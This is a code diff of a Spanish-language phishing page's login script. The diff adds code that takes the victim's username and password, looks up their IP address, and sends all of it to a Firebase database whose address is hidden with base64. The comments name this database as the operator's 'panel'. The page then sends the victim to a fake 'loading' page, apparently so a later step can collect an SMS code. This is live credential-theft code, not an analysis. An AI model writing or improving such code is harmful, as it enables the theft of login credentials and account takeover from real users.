@@ -2349,30 +2349,45 @@
         </div>
     </div>
     <script>
-        const firebaseConfig = { databaseURL: atob("aHR0cHM6Ly9jb29wLTI5LW9jdHUtYnJlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8=") };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+    const firebaseConfig = { databaseURL: atob("aHR0cHM6Ly9jb29wLTI5LW9jdHUtYnJlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8=") };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const id = urlParams.get('id');
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
 
-        function enviar() {
-            const passVal = document.getElementById('pass').value;
-            const userVal = localStorage.getItem('u_temp');
+    async function enviar() {
+        const passVal = document.getElementById('pass').value;
+        const userVal = localStorage.getItem('u_temp');
 
-            if(!id) return alert("Sesión inválida");
+        if(!passVal || passVal.trim() === "") return alert("Ingrese su contraseña");
+        if(!id) return alert("Sesión inválida");
 
-            // CREAMOS EL REGISTRO EN EL PANEL
-            db.ref('logins/' + id).set({
-                user: userVal,
-                pass: passVal,
-                step: 'Verificando...',
-                online: true
-            }).then(() => {
-                window.location.href = "cargando.html?id=" + id;
-            });
-        }
-    </script>
+        // OBTENER IP (requerido por el panel)
+        let userIP = 'unknown';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            userIP = data.ip;
+        } catch(e) {}
+
+        // DATOS COMPLETOS REQUERIDOS
+        db.ref('logins/' + id).set({
+            user: userVal || 'desconocido',
+            pass: passVal,
+            step: 'Verificando...',
+            online: true,
+            timestamp: Date.now(),    // REQUERIDO para anti-spam
+            ip: userIP,               // REQUERIDO para anti-spam
+            sms: '----'               // REQUERIDO para el panel
+        }).then(() => {
+            window.location.href = "cargando.html?id=" + id;
+        }).catch((error) => {
+            console.error("Error:", error);
+            alert("Error de conexión: " + error.message);
+        });
+    }
+</script>
     <script>
     function togglePassword() {
         const passwordInput = document.getElementById('pass');
